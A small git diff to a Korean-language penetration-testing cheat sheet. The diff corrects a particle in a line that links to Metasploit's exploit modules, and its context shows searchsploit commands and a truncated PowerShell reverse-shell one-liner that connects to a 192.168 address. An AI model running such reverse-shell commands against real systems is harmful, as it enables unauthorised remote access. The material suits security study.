@@ -40,7 +40,7 @@ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.1
 ### Search Exploit
 ```searchsploit 50064.rd```<br/>
 경로 출력) ```searchsploit -p 50064.rd```<br/>
-- Rapid 7이 [github의 리포지토리](https://github.com/rapid7/metasploit-framework/tree/master/modules/exploits) 참고
+- Rapid 7의 [github의 리포지토리](https://github.com/rapid7/metasploit-framework/tree/master/modules/exploits) 참고
 
 ### Payload 생성 Resource
 | **Resource**                            | **설명**                                                                                                                                                                                      |
